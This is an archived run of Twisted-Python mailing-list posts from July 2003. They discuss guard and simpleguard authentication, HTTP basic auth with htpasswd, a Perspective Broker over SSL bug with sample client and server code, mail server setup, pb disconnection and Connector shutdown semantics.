> of time for documentation has made something like this necessary.

I disagree it was a documentation problem -- it was an overhead problem.
webhappyrealm has a *lot* of code related to authentication, compared
to code related to the problem domain. In doc/examples/simpleguard*.py,
even though the code of the problem domain is short [greeting people
we know, insulting people we don't] it is still about half or more
of the code.

In Plonk, which was my original use-case, using simpleguard meant that
we *removed* lots of code, and only changed one method (Blob.writerp).

Note that even if you do use simpleguard, you can still graduate to
use guard itself if and when you need the power [for example, having
something more complicated than authed/non-authed, or using the
same Realm for non-web uses]. You can do that, for example, by
inheriting from MarkingRealm and overriding methods in it.

Your code will still be able to use things like
request.getComponent(Authenticated).name to get the username of logged
in user, so the resources themselves will not have to be modified. 

So, I think of the simpleguard/guard decision as "make easy things
easy, make difficult things possible". webhappyrealm shows how to make
difficult things possible -- simpleguard examples show how to make
easy things easy.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From glyph at twistedmatrix.com  Mon Jul 21 05:54:22 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Mon, 21 Jul 2003 04:54:22 -0500
Subject: [Twisted-Python] Guard
In-Reply-To: <20030721091915.7967.qmail@green.zadka.com>
Message-ID: <4DDF19C5-BB61-11D7-9652-000393C9700E@twistedmatrix.com>

On Monday, July 21, 2003, at 04:19 AM, Moshe Zadka wrote:

> So, I think of the simpleguard/guard decision as "make easy things
> easy, make difficult things possible". webhappyrealm shows how to make
> difficult things possible -- simpleguard examples show how to make
> easy things easy.

Hmm.  Your point about migration is well-taken; perhaps this code is 
not so bad as I made it out to be.

I suppose the next thing to do would be to flesh out webhappyrealm a 
little bit and add it to doc/examples rather than relegating it to 
sandbox.  Can a PicturePile expert comment on the feasibility of adding 
both kinds of authentication to it, so as to demonstrate both 
approaches and how to move from one to the other?




From glyph at twistedmatrix.com  Mon Jul 21 06:36:49 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Mon, 21 Jul 2003 05:36:49 -0500
Subject: [Twisted-Python] htpasswd / HTTP basic auth example
In-Reply-To: <20030721012716.GG10749@frobozz>
Message-ID: <3C06ED61-BB67-11D7-9652-000393C9700E@twistedmatrix.com>

On Sunday, July 20, 2003, at 08:27 PM, Andrew Bennetts wrote:

> This reminds me -- I wrote a simple resource wrapper recently that 
> provides
> HTTP basic auth, reading from a htpasswd(1) file [currently it only 
> supports
> crypt'ed passwords, not MD5].  This doesn't use guard (or even 
> newcred) at
> all, although it probably should.

Actually, it ought to use newcred and be a part of guard.  HTTP auth is 
really a funky way of establishing a session.  It works totally 
differently from guard's SessionWrapper, but you get the same effect - 
this implementation detail would ideally be specified by some kind of 
configuration rather than by the application author directly, but, uh 
... coil :).

In short, if someone is going to enhance this to support newcred, don't 
get too hung up on the way the existing woven.guard stuff works :).




From illumen at yahoo.com  Mon Jul 21 06:54:35 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Mon, 21 Jul 2003 20:54:35 +1000
Subject: [Twisted-Python] client-server communication + ssl + wxpython:
 newbie question, help please
In-Reply-To: <3F1AFE5D.5050105@is.lg.ua>
References: <3F1AFE5D.5050105@is.lg.ua>
Message-ID: <3F1BC66B.9050108@yahoo.com>

Ruslan Spivak wrote:

> Hello, twisted users!
>
> I'm newbie to twisted and after reading documentation feel somewhat a 
> little bit confused, don't know where to start.
> Can you give an advice on the following:
>
> I need to have a server and a GUI client(wxpython), which communicates 
> using ssl.
> Server:
>    - it should take requests for establishing connection from a lot of 
> GUI clients using ssl
>    - the request for connection method will pass to server simple 
> types (strings and dicts)
>    - server will ask radius  server if such user exists, and if so 
> then it writes some info to database(MySQL) and adds some rules to 
> firewall. If such user doesn't exist in radius, then it raises 
> exception to remote client or just return error code.
>    - If client succeded in connection, then server should every 3 
> minutes call method 'checkpoint' on client. If it doesn't receive 
> response from client, it deletes rules from firewall and writes some 
> info to database.
>
> Client:
>     - wxpython gui based client, that tries to connect to remote 
> server using ssl(Connection means connecting to some port on the 
> server, passing parameters to remote method 'connect' and if there is 
> no exception or return code == 1, connection is successfull and 
> message printed to happy user).
>     - client contains method that will be periodically(each 3 minutes) 
> called by server after successful connection
>
> I just don't know where to start. Should client implement Root.pb as 
> from Chapter 5(Perspective broker), so that it can pass reference to 
> server and server can call methods on it or maybe i need implement 
> some protocol? And how ssl fits in all this? Is it high-level or 
> low-level twisted to impelemt features i've described?
> Thanks in advance.
> Your help is very, very appreciated.
>
> Best regards,
> Ruslan
>
The way I got the listening peer(the server) to be able to make calls to 
the connecting one(client) was to do what you describe.  Return a 
subclass of pb.Root to a method on the server which stores that 
somewhere where it can make calls to it later.

I think you can use listenSSL instead of listenTCP.  Haven't used it 
myself.  Have you looked in the examples, or tests directories?

If you have lots of clients, you may want to get them to disconnect so 
your server doesn't get overloaded.






From andrew-twisted at puzzling.org  Mon Jul 21 07:03:43 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Mon, 21 Jul 2003 21:03:43 +1000
Subject: [Twisted-Python] htpasswd / HTTP basic auth example
In-Reply-To: <3C06ED61-BB67-11D7-9652-000393C9700E@twistedmatrix.com>
References: <20030721012716.GG10749@frobozz> <3C06ED61-BB67-11D7-9652-000393C9700E@twistedmatrix.com>
Message-ID: <20030721110342.GH10749@frobozz>

On Mon, Jul 21, 2003 at 05:36:49AM -0500, Glyph Lefkowitz wrote:
> On Sunday, July 20, 2003, at 08:27 PM, Andrew Bennetts wrote:
> 
> >This reminds me -- I wrote a simple resource wrapper recently that
> >provides HTTP basic auth, reading from a htpasswd(1) file [currently it
> >only supports crypt'ed passwords, not MD5].  This doesn't use guard (or
> >even newcred) at all, although it probably should.
> 
> Actually, it ought to use newcred and be a part of guard.  HTTP auth is 
> really a funky way of establishing a session.  It works totally 
> differently from guard's SessionWrapper, but you get the same effect - 
> this implementation detail would ideally be specified by some kind of 
> configuration rather than by the application author directly, but, uh 
> ... coil :).
> 
> In short, if someone is going to enhance this to support newcred, don't 
> get too hung up on the way the existing woven.guard stuff works :).

For what it's worth, I originally *tried* to implement this with
newcred/guard, and couldn't figure out how.  I seem to recall that a large
stumbling block was UsernamePasswordWrapper not being useful if you are
trying to compare against *hashed* passwords;
IUsernamePassword.checkPassword assumes you have the cleartext to validate
against.  In hindsight, I probably didn't want SessionWrapper, either,
because I didn't want sessions (just simple "you can/cannot access this
resource and its children").  

I didn't need massive flexibility for my particular use-case (which was
emulating Apache's .htpasswd functionality), so I just did it the simplest
way I could, ignoring the existing infrastructure.  I think I have to agree
with Moshe -- the existing guard stuff is too large and/or too difficult for
an uninitiated developer to work with.

-Andrew.




From jml at ids.org.au  Mon Jul 21 08:35:40 2003
From: jml at ids.org.au (Jonathan Lange)
Date: Mon, 21 Jul 2003 22:35:40 +1000
Subject: [Twisted-Python] Twisted Bug Tracking
In-Reply-To: <20030703061203.GE665@sting>; from jml@ids.org.au on Thu, Jul 03, 2003 at 16:12:03 +1000
References: <20030703054426.GC665@sting> <20030703061203.GE665@sting>
Message-ID: <20030721123540.GA24408@sting>

On 2003.07.03 16:12, Jonathan Lange wrote:
> 
> If not, and there is some other solution in mind, let's switch to 
> that now, and kill off Issues entirely (except perhaps as an 
> example). After all "code is a liability, functionality is an asset".
> 

After much discussion, consideration, illicit drug taking, rehab, 
therapy, more drugs, less rehab, an affair with a soprano (actor, not 
singer) and a cup of tea, it has been decided that Issues is indeed 
destined for the garbage bin. 
Thus, I am no longer maintaining it. I've moved my stuff from SVN into 
pyramid's CVS for "the benefit of posterity" (from the slightly-updated 
README). 
By the time you read this, any web pages of mine that refer to it will 
have been taken down.

It has been killed. Dead. Finito.

cheers,
jml



From mario at ruggier.org  Mon Jul 21 09:06:16 2003
From: mario at ruggier.org (Mario Ruggier)
Date: Mon, 21 Jul 2003 15:06:16 +0200
Subject: [Twisted-Python] Twisted Bug Tracking
In-Reply-To: <20030721123540.GA24408@sting>
Message-ID: <1CFE42EA-BB7C-11D7-991E-000393756786@ruggier.org>

why?
or, what is to be learned from this?

mario

On Lundi, juil 21, 2003, at 14:35, Jonathan Lange wrote:
> On 2003.07.03 16:12, Jonathan Lange wrote:
>> If not, and there is some other solution in mind, let's switch to 
>> that now, and kill off Issues entirely (except perhaps as an 
>> example). After all "code is a liability, functionality is an asset".
>
> After much discussion, consideration, illicit drug taking, rehab, 
> therapy, more drugs, less rehab, an affair with a soprano (actor, not 
> singer) and a cup of tea, it has been decided that Issues is indeed 
> destined for the garbage bin. Thus, I am no longer maintaining it. 
> I've moved my stuff from SVN into pyramid's CVS for "the benefit of 
> posterity" (from the slightly-updated README). By the time you read 
> this, any web pages of mine that refer to it will have been taken > down.
>
> It has been killed. Dead. Finito.
>
> cheers,
> jml
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python




From lafou at wanadoo.fr  Mon Jul 21 10:13:06 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 21 Jul 2003 16:13:06 +0200
Subject: [Twisted-Python] t.w.woven.widgets patch
Message-ID: <1058796786.7682.9.camel@biproc>

Hi all,

I am really surprised by the way the Anchor widget works. It would be
really helpful to have a template similar to generated output.
With that kind of template :

****
<ul model="directory" view="List">
  <li pattern="listItem"><a href="#" view="Anchor">ListItem</a></li>
  <li pattern="emptyList">No files</li>
</ul>
****

the output is currently :

****
ListItemfile1
ListItemfile2
ListItemfile3
****
instead of 

****
file1
file2
file3
****

Here is a patch that corrects this behaviour

--
Gravis
-------------- next part --------------
A non-text attachment was scrubbed...
Name: patch_widgets.py
Type: text/x-patch
Size: 621 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030721/7a56cc0c/attachment.bin 

From itamar at itamarst.org  Mon Jul 21 12:53:51 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 21 Jul 2003 12:53:51 -0400
Subject: [Twisted-Python] htpasswd / HTTP basic auth example
In-Reply-To: <20030721110342.GH10749@frobozz>
References: <20030721012716.GG10749@frobozz>
	<3C06ED61-BB67-11D7-9652-000393C9700E@twistedmatrix.com>
	<20030721110342.GH10749@frobozz>
Message-ID: <20030721125351.6f36683c.itamar@itamarst.org>

On Mon, 21 Jul 2003 21:03:43 +1000
Andrew Bennetts <andrew-twisted at puzzling.org> wrote:
> 
> For what it's worth, I originally *tried* to implement this with
> newcred/guard, and couldn't figure out how.  I seem to recall that a
> large stumbling block was UsernamePasswordWrapper not being useful if
> you are trying to compare against *hashed* passwords;

We now have a new credential type whose name I forget, or possibly the
same one. Anyway, *some* credential type, which explicitly exposes the
password. Which is what you should use. And it was added for the exact
reason you mentioned.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From daleedom at hightowergroup.com  Mon Jul 21 13:13:13 2003
From: daleedom at hightowergroup.com (David A. Leedom)
Date: Mon, 21 Jul 2003 13:13:13 -0400
Subject: [Twisted-Python] Mail Server
Message-ID: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>

I am new to Twisted Matrix.

I am trying to setup an mail system that will use a database as the 
datastore for emails, domains and user access (both pop3/imap and stmp).

What I am looking for is a code snipit example of how to setup a POP3 and 
SMTP server using frame work without using the TAP utility.

I figure once I have this example then I can begin to understand the 
documentation better.  There is something missing in the explanation of how 
things work.  It just goes over my head.

Thanks You,

Dave Leedom





The Hightower Group, Inc.
Information Technology Consulting

165 West Airport Road/Lititz, PA 17543
V:717-560-4002, 877-560-4002 x: 114
F:717-560-2825
www.hightowergroup.com 
-------------- next part --------------

---
Outgoing mail is certified Virus Free.
Checked by AVG anti-virus system (http://www.grisoft.com).
Version: 6.0.498 / Virus Database: 297 - Release Date: 7/8/2003

From bobhicks at adelphia.net  Mon Jul 21 17:11:06 2003
From: bobhicks at adelphia.net (Bob Hicks)
Date: Mon, 21 Jul 2003 17:11:06 -0400
Subject: [Twisted-Python] Python 2.3 and Twisted 1.0.6
Message-ID: <002001c34fcc$9cc9cf20$c6303118@ptah>

Does the current Twisted framework work with 2.3 or do I need to wait a
bit?

Bob





From itamar at itamarst.org  Mon Jul 21 17:29:21 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 21 Jul 2003 17:29:21 -0400
Subject: [Twisted-Python] Python 2.3 and Twisted 1.0.6
In-Reply-To: <002001c34fcc$9cc9cf20$c6303118@ptah>
References: <002001c34fcc$9cc9cf20$c6303118@ptah>
Message-ID: <20030721172921.259eedf5.itamar@itamarst.org>

On Mon, 21 Jul 2003 17:11:06 -0400
"Bob Hicks" <bobhicks at adelphia.net> wrote:

> Does the current Twisted framework work with 2.3 or do I need to wait
> a bit?

The buildbot (http://www.twistedmatrix.com/buildbot/) runs all the tests
on 2.3. Seems to work just fine.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From alienoid at is.lg.ua  Mon Jul 21 17:43:48 2003
From: alienoid at is.lg.ua (Ruslan Spivak)
Date: Tue, 22 Jul 2003 00:43:48 +0300
Subject: [Twisted-Python] getObjectAtSSL: Exception
Message-ID: <3F1C5E94.8050103@is.lg.ua>

Hello!

Here is the simple server:

from twisted.spread import pb
from twisted.internet import app, reactor
from OpenSSL import SSL

class ServerContextFactory:

    def getContext(self):
        """Create an SSL context.

        This is a sample implementation that loads a certificate from a file
        called 'server.pem'."""
        ctx = SSL.Context(SSL.SSLv23_METHOD)
        ctx.use_certificate_file('server.pem')
        ctx.use_privatekey_file('server.pem')
        return ctx
 
class Server(pb.Root):
    def __init__(self):
        self.client = None
       
    def checkpoint(self):
        self.client.callRemote("printClientMsg", "Hello from 
Server.checkpoint")
        reactor.callLater(2, self.checkpoint)
       
    def remote_printServerMsg(self, client, msg):
        print "Server got: %s" % msg
        self.client = client
        client.callRemote("printClientMsg", "Hello from 
Server.printServerMsg")
        reactor.callLater(2, self.checkpoint)
       
if __name__ == "__main__":
    appl = app.Application("pbtest")
    appl.listenSSL(33333, pb.BrokerFactory(Server()), 
ServerContextFactory())
    appl.run()



When i try to run pbclient.py:

from twisted.spread import pb
from twisted.internet import reactor

class ClientCall(pb.Referenceable):
    def remote_printClientMsg(self, msg):
        print "Client: %s" % msg

def got_obj(obj, c):
    obj.callRemote("printServerMsg", c, "Hello from Client")
       
c = ClientCall()
def1 = pb.getObjectAtSSL("localhost", 33333, 30)
def1.addCallback(got_obj, c)
reactor.run()

I get:

Traceback (most recent call last):
  File "pbclient.py", line 12, in ?
    def1 = pb.getObjectAtSSL("localhost", 33333, 30)
  File "/usr/lib/python2.2/site-packages/twisted/spread/pb.py", line 
1190, in getObjectAtSSL
    reactor.connectSSL(host, port, bf, timeout)
  File "/usr/lib/python2.2/site-packages/twisted/internet/default.py", 
line 260, in connectSSL
    c.connect()
  File "/usr/lib/python2.2/site-packages/twisted/internet/base.py", line 
504, in connect
    self.transport = transport = self._makeTransport()
  File "/usr/lib/python2.2/site-packages/twisted/internet/ssl.py", line 
173, in _makeTransport
    return Client(self.host, self.port, self.bindAddress, 
self.contextFactory, self, self.reactor)
  File "/usr/lib/python2.2/site-packages/twisted/internet/ssl.py", line 
104, in __init__
    tcp.Client.__init__(self, host, port, bindAddress, connector, reactor)
  File "/usr/lib/python2.2/site-packages/twisted/internet/tcp.py", line 
430, in __init__
    self._finishInit(whenDone, skt, err, reactor)
  File "/usr/lib/python2.2/site-packages/twisted/internet/ssl.py", line 
122, in _finishInit
    self.startTLS(self.ctxFactory)
  File "/usr/lib/python2.2/site-packages/twisted/internet/tcp.py", line 
303, in startTLS
    holder = Connection.startTLS(self, ctx)
  File "/usr/lib/python2.2/site-packages/twisted/internet/tcp.py", line 
190, in startTLS
    self.socket = SSL.Connection(ctx.getContext(), self.socket)
AttributeError: 'int' object has no attribute 'getContext'

What's wrong?
Your help is very appreciated. Thanks in advance.

Best regards,
Ruslan




From alienoid at is.lg.ua  Mon Jul 21 18:17:33 2003
From: alienoid at is.lg.ua (Ruslan Spivak)
Date: Tue, 22 Jul 2003 01:17:33 +0300
Subject: [Twisted-Python] getObjectAtSSL: client just hangs
Message-ID: <3F1C667D.1090903@is.lg.ua>

Hello!

I found patch to spread.pb, so that there is no exception , but now my 
client just hangs with no response.

Here is the simple server:

from twisted.spread import pb
from twisted.internet import app, reactor
from OpenSSL import SSL

class ServerContextFactory:

   def getContext(self):
       """Create an SSL context.

       This is a sample implementation that loads a certificate from a file
       called 'server.pem'."""
       ctx = SSL.Context(SSL.SSLv23_METHOD)
       ctx.use_certificate_file('server.pem')
       ctx.use_privatekey_file('server.pem')
       return ctx

class Server(pb.Root):
   def __init__(self):
       self.client = None
         def checkpoint(self):
       self.client.callRemote("printClientMsg", "Hello from 
Server.checkpoint")
       reactor.callLater(2, self.checkpoint)
         def remote_printServerMsg(self, client, msg):
       print "Server got: %s" % msg
       self.client = client
       client.callRemote("printClientMsg", "Hello from 
Server.printServerMsg")
       reactor.callLater(2, self.checkpoint)
      if __name__ == "__main__":
   appl = app.Application("pbtest")
   appl.listenSSL(33333, pb.BrokerFactory(Server()), 
ServerContextFactory())
   appl.run()



Heres is client  pbclient.py:

from twisted.spread import pb
from twisted.internet import reactor

class ClientCall(pb.Referenceable):
   def remote_printClientMsg(self, msg):
       print "Client: %s" % msg

def got_obj(obj, c):
   obj.callRemote("printServerMsg", c, "Hello from Client")
      c = ClientCall()
def1 = pb.getObjectAtSSL("localhost", 33333, 30)
def1.addCallback(got_obj, c)
reactor.run()


Your help is very appreciated. Thanks in advance.

Best regards,
Ruslan




From andrew-twisted at puzzling.org  Mon Jul 21 19:32:02 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 22 Jul 2003 09:32:02 +1000
Subject: [Twisted-Python] htpasswd / HTTP basic auth example
In-Reply-To: <20030721125351.6f36683c.itamar@itamarst.org>
References: <20030721012716.GG10749@frobozz> <3C06ED61-BB67-11D7-9652-000393C9700E@twistedmatrix.com> <20030721110342.GH10749@frobozz> <20030721125351.6f36683c.itamar@itamarst.org>
Message-ID: <20030721233202.GI10749@frobozz>

On Mon, Jul 21, 2003 at 12:53:51PM -0400, Itamar Shtull-Trauring wrote:
> On Mon, 21 Jul 2003 21:03:43 +1000
> Andrew Bennetts <andrew-twisted at puzzling.org> wrote:
> > 
> > For what it's worth, I originally *tried* to implement this with
> > newcred/guard, and couldn't figure out how.  I seem to recall that a
> > large stumbling block was UsernamePasswordWrapper not being useful if
> > you are trying to compare against *hashed* passwords;
> 
> We now have a new credential type whose name I forget, or possibly the
> same one. Anyway, *some* credential type, which explicitly exposes the
> password. Which is what you should use. And it was added for the exact
> reason you mentioned.

IUsernameHashedPassword, I believe.  It got added after I wrote this and
whinged to Jp, iirc ;)

Regardless, UsernamePasswordWrapper has its credentials checker class
hardcoded to UsernamePassword (which implements IUsernamePassword) in a
nested function in the middle of a forty-line function, so it's still rather
useless to me.  It might be nice if that aspect of UsernamePasswordWrapper
was parameterised...

UsernamePasswordWrapper also assumes form-based authentication, if I'm
understanding correctly.  I'm not hugely wedded to HTTP basic auth, but it
is useful for some things, so it would be nice if UPW was able to return
something other than form.FormProcessor in the "INIT_PERSPECTIVE" case (and
I'm not certain I like the login URL being hard-coded... 'perspective-init'
strikes me as an implementation detail, like '.html' or '.asp', that users
shouldn't have to see -- 'login' would make more sense to most people).

Anyway, it was clear to me that the existing stable version of Twisted
couldn't support what I needed via guard, which is why I took the route I
did.  If someone who understands this stuff wants to incorporate htpasswd
and/or HTTP basic auth in such a way that I can use it from guard, I won't
complain :)

-Andrew.




From andrew-twisted at puzzling.org  Mon Jul 21 19:35:45 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 22 Jul 2003 09:35:45 +1000
Subject: [Twisted-Python] Mail Server
In-Reply-To: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
Message-ID: <20030721233545.GJ10749@frobozz>

On Mon, Jul 21, 2003 at 01:13:13PM -0400, David A. Leedom wrote:
> I am new to Twisted Matrix.
> 
> I am trying to setup an mail system that will use a database as the 
> datastore for emails, domains and user access (both pop3/imap and stmp).
> 
> What I am looking for is a code snipit example of how to setup a POP3 and 
> SMTP server using frame work without using the TAP utility.
> 
> I figure once I have this example then I can begin to understand the 
> documentation better.  There is something missing in the explanation of how 
> things work.  It just goes over my head.

Why not look at how the TAP utility does it? :)

Have a look at twisted/mail/tap.py, in particular the 'updateApplication'
method.

Also, I believe that IMAP, POP3 and SMTP have all had a lot of work done on
them in CVS recently, so it might be worth using CVS, or at least the latest
alpha release (1.0.7 alpha 2).  They're improving quite rapidly, judging
from the number of commits (and tests!) Jp is making.

-Andrew.




From andrew-twisted at puzzling.org  Mon Jul 21 19:41:15 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 22 Jul 2003 09:41:15 +1000
Subject: [Twisted-Python] getObjectAtSSL: Exception
In-Reply-To: <3F1C5E94.8050103@is.lg.ua>
References: <3F1C5E94.8050103@is.lg.ua>
Message-ID: <20030721234115.GK10749@frobozz>

On Tue, Jul 22, 2003 at 12:43:48AM +0300, Ruslan Spivak wrote:
> Hello!
> 
> Here is the simple server:
> 
[...]
> AttributeError: 'int' object has no attribute 'getContext'
> 
> What's wrong?
> Your help is very appreciated. Thanks in advance.

This was fixed in CVS a week or so ago -- try using the 1.0.7 alpha release,
which should have the fix for that.

I'm not sure if that's likely to help your second problem or not, though.
One tip though: *always* add errbacks to your deferreds, e.g.:

    from twisted.python import log
    d.addErrback(log.err)

Silently ignored errors due to lack of errbacks is a very common cause of
mysterious hangs.

I hope this helps,

-Andrew.




From andrew-twisted at puzzling.org  Mon Jul 21 20:45:40 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 22 Jul 2003 10:45:40 +1000
Subject: [Twisted-Python] Re: [Twisted-commits] callWhenRunning interface and implementation
In-Reply-To: <E19ejaQ-0000Ck-00@pyramid.twistedmatrix.com>
References: <E19ejaQ-0000Ck-00@pyramid.twistedmatrix.com>
Message-ID: <20030722004540.GA29030@frobozz>

On Mon, Jul 21, 2003 at 05:56:54PM -0500, davep CVS wrote:
> Modified files:
> Twisted/ChangeLog 1.429 1.430
> Twisted/twisted/internet/base.py 1.58 1.59
> Twisted/twisted/internet/interfaces.py 1.88 1.89
> 
> Log message:
> callWhenRunning interface and implementation
[...]
> +++ Twisted/twisted/internet/interfaces.py	Mon Jul 21 17:56:22 2003
[...]
> @@ -589,6 +589,23 @@
>          """Removes a trigger added with addSystemEventTrigger.
>  
>          @param triggerID: a value returned from addSystemEventTrigger.
> +        """
> +
> +    def callWhenRunning(self, callable, *args, **kw):
> +        """Call a function when the reactor is running.
> +
> +        If the reactor has not started, the callable will be scheduled
[...]

I wonder, when we add methods to stable interfaces, if we should put a note
in the docstrings of those methods saying something like "New in 1.0.7"?

-Andrew.




From dave at krondo.com  Mon Jul 21 21:15:36 2003
From: dave at krondo.com (Dave Peticolas)
Date: 21 Jul 2003 18:15:36 -0700
Subject: [Twisted-Python] Re: [Twisted-commits] callWhenRunning
	interface and implementation
In-Reply-To: <20030722004540.GA29030@frobozz>
References: <E19ejaQ-0000Ck-00@pyramid.twistedmatrix.com>
	 <20030722004540.GA29030@frobozz>
Message-ID: <1058836536.18662.15.camel@oneiros>

On Mon, 2003-07-21 at 17:45, Andrew Bennetts wrote:
...
> I wonder, when we add methods to stable interfaces, if we should put a note
> in the docstrings of those methods saying something like "New in 1.0.7"?

Probably a good idea, but I'm going to wait to add it to this
one since, after discussion with Itamar, it may come right back
out.

dave

-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: This is a digitally signed message part
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030721/a7488f7a/attachment.pgp 

From uwe at oss4u.com  Mon Jul 21 21:21:05 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Mon, 21 Jul 2003 18:21:05 -0700
Subject: [Twisted-Python] Explicit disconnect from pb
Message-ID: <200307211821.05919.uwe@oss4u.com>

Hi,

I looked qround, but I can't find any information on how to disconnect from a 
pb session without ending the client.

I have a service which I'm connecting to. Some time later I want to disconnect 
from this service to free up ressources ( the service keeps database 
connections etc, and I want to get rid of them ).
The only thing I have on the client side is a remotereference to the 
perspective instance. So how do I disconnect from something I don't have a 
reference to ? Somehow there must be something I can call to disconnect the 
session (and on the server side trigger the disconnect handlers)

TIA

	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From illumen at yahoo.com  Mon Jul 21 21:29:30 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Tue, 22 Jul 2003 11:29:30 +1000
Subject: [Twisted-Python] Mail Server
In-Reply-To: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
References: <5.2.0.9.0.20030721130816.02778df8@mail.hightowergroup.com>
Message-ID: <3F1C937A.1070506@yahoo.com>

David A. Leedom wrote:

> I am new to Twisted Matrix.
>
> I am trying to setup an mail system that will use a database as the 
> datastore for emails, domains and user access (both pop3/imap and stmp).
>
> What I am looking for is a code snipit example of how to setup a POP3 
> and SMTP server using frame work without using the TAP utility.
>
> I figure once I have this example then I can begin to understand the 
> documentation better.  There is something missing in the explanation 
> of how things work.  It just goes over my head.
>
> Thanks You,
>
> Dave Leedom
>

Have a look at the tap code in the mail/tap.py for mail.  Other tap 
files are in the tap/ directory of twisted.  That's how I figured out 
how to use the gtk manhole without using taps.

If anyone has spare time, making the adding/removing of servers simpler 
from code without using taps would be nice :)  Maybe a functional api 
which matches the tap utility?







From andrew-twisted at puzzling.org  Mon Jul 21 21:35:53 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 22 Jul 2003 11:35:53 +1000
Subject: [Twisted-Python] Explicit disconnect from pb
In-Reply-To: <200307211821.05919.uwe@oss4u.com>
References: <200307211821.05919.uwe@oss4u.com>
Message-ID: <20030722013553.GB29030@frobozz>

On Mon, Jul 21, 2003 at 06:21:05PM -0700, Uwe C. Schroeder wrote:
> 
> Hi,
> 
> I looked qround, but I can't find any information on how to disconnect from a 
> pb session without ending the client.
> 
> I have a service which I'm connecting to. Some time later I want to disconnect 
> from this service to free up ressources ( the service keeps database 
> connections etc, and I want to get rid of them ).
> The only thing I have on the client side is a remotereference to the 
> perspective instance. So how do I disconnect from something I don't have a 
> reference to ? Somehow there must be something I can call to disconnect the 
> session (and on the server side trigger the disconnect handlers)

This sounds related to this bug:
    http://twistedmatrix.com/bugs/issue62

-Andrew.




From uwe at oss4u.com  Mon Jul 21 21:47:04 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Mon, 21 Jul 2003 18:47:04 -0700
Subject: [Twisted-Python] Explicit disconnect from pb
In-Reply-To: <20030722013553.GB29030@frobozz>
References: <200307211821.05919.uwe@oss4u.com> <20030722013553.GB29030@frobozz>
Message-ID: <200307211847.04954.uwe@oss4u.com>

On Monday 21 July 2003 06:35 pm, Andrew Bennetts wrote:
> On Mon, Jul 21, 2003 at 06:21:05PM -0700, Uwe C. Schroeder wrote:
> > Hi,
> >
> > I looked qround, but I can't find any information on how to disconnect
> > from a pb session without ending the client.
> >
> > I have a service which I'm connecting to. Some time later I want to
> > disconnect from this service to free up ressources ( the service keeps
> > database connections etc, and I want to get rid of them ).
> > The only thing I have on the client side is a remotereference to the
> > perspective instance. So how do I disconnect from something I don't have
> > a reference to ? Somehow there must be something I can call to disconnect
> > the session (and on the server side trigger the disconnect handlers)
>
> This sounds related to this bug:
>     http://twistedmatrix.com/bugs/issue62

Yep, sound like it.
What I just tried ( and what partially works, at least for my purpose) is to 
have a perspective_disconnect method in the perspective class which just 
free's up the ressources I want to get rid of. certainly the connection still 
hangs around until I close the client. I my case droping the database 
connection which is no longer in use is more of a concern, so that works for 
me. (each client opens 2 database connections at startup - one is solely for 
login and gui definitions and has no password, the second is started after 
login. Therefor I don't need the first connection anymore. But I need to 
close the db connection since this server is intended to serve possibly up to 
500 clients at a time, which would be 500 useless db connections)

	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From dizzyd at jabber.org  Mon Jul 21 23:07:52 2003
From: dizzyd at jabber.org (Dave Smith)
Date: Mon, 21 Jul 2003 21:07:52 -0600
Subject: [Twisted-Python] Connector Inconsistency
Message-ID: <AE98B9B6-BBF1-11D7-B329-00039386381C@jabber.org>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Greetings,

In talking with Itamar, the question came up of how to correctly 
shutdown a Connector. For example:

c = reactor.connectTCP(host, port, factory)
c.loseConnection() # ?!
# or
c.stopConnecting() # ?!

It is not codified anywhere that "loseConnection" will shutdown the 
connection, even if the connection is pending. As it stands now, you 
could call c.stopConnecting() or c.loseConnection(). The "correct" one 
to call is impossible to diagnose, as I can find no calls which 
indicate the state (in terms of connection) of the Connector. As such, 
I would suggest we drop the "stopConnecting" call and set it in stone 
that loseConnection() will do the Right Thing and stop connecting if in 
progress.

Any objections or alternatives?

Diz
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.1 (Darwin)

iD8DBQE/HKqIYNE3chVHHsMRAvXoAKCzIMtOg8BaoiZrNbQnv9m2LZk6IACfWu8/
1r1FgHsmQp1hZQK/KogLHlk=
=Zb5b
